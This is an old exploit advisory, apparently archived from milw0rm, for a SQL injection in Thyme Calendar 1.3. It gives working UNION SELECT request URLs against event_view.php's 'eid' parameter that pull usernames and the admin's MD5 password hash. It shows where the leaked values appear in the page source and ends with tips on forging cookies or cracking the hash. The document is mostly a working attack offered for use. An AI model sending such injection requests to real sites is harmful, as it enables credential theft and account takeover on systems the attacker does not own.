@@ -1,0 +1,82 @@
+                 ##################################################
+                 ## Thyme Calendar 1.3 SQL Vulnerability Exploit ##
+                 ##                  by Warlord                  ##
+                 ##################################################
+                 ##              codehook.110mb.com              ##
+                 ##################################################
+
+-------------------------------------------------------------------
+OVERVIEW AND DEFINITION
+-------------------------------------------------------------------
+
+A vulnerability in exists in Thyme Calendar 1.3 (and possibly lower 
+versions) which
+allows execution of a custom SQL query.
+
+The vulnerability exists in event_view.php, because the 'eid' field is not 
+properly
+validated. An attacker could exploit the vulnerabilit with the following 
+request:
+
+
+http://sitename/thyme_directory/event_view.php?eid=34 UNION SELECT userid 
+FROM thyme_Users
+
+
+Where 'sitename' is the name of the site, and 'thyme_directory' is the 
+directory in which
+Thyme is located.
+
+-------------------------------------------------------------------
+SQL QUERY
+-------------------------------------------------------------------
+
+The SQL query originally looks like this:
+
+
+SELECT id FROM thyme_Attachments WHERE eid = 34
+
+
+But by changing the 'eid' field we get a query that looks like this:
+
+
+SELECT id FROM thyme_Attachments WHERE eid = 34 UNION SELECT userid FROM 
+thyme_Users
+
+-------------------------------------------------------------------
+RESULT OF NEW QUERY
+-------------------------------------------------------------------
+
+The result is that the query sends back all the userid's (actually 
+usernames) from the
+database instead of the 'id' from thyme_Attachments. You will be able to 
+grab the userid's
+from the HTML source by searching for 'aid=' as this is where the attachment 
+id is
+supposed to go. For example:
+
+http://sitename/thyme_directory/download_attachment.php?aid=admin
+
+-------------------------------------------------------------------
+GETTING PASSWORDS
+-------------------------------------------------------------------
+
+And the password (md5'd) can be obtained in the same fashion:
+
+http://sitename/thyme_directory/event_view.php?eid=34 UNION SELECT pass FROM 
+thyme_Users
+WHERE username = "admin"
+
+In the HTML source:
+
+http://sitename/thyme_directory/download_attachment.php?aid=9ab1c5afa4946ca0030271736f38c83a
+
+-------------------------------------------------------------------
+HOW TO EXPLOIT
+-------------------------------------------------------------------
+
+Cookies should be modifiable. If not, crack the md5!
+
+http://md5.rednoize.com
+
+# milw0rm.com [2007-05-10]
